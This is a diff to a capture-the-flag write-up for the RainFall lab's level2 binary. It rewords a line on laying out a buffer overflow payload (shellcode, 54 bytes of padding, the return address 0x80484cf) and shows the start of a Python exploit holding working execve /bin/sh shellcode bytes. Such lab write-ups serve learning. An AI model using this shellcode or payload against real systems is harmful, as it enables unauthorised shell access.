@@ -381,7 +381,7 @@ level2@RainFall:~$ objdump -d level2 | grep "eax"
 yay, found you motherfucker, so we will override the RET from the p function with that address **80484cf**
 
 ### injecting
-So, we will have the shellcode injected then the address, shellcode is 26 bytes long, so 80 - 26 = 54, we will have shellcode + 54 character + [0x80484cf]
+So, shellcode is injected then the address, shellcode is 26 bytes long, so 80 - 26 = 54, so shellcode + 54 character + [0x80484cf]
 ```
 #!/usr/bin/python
 shellcode = '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'
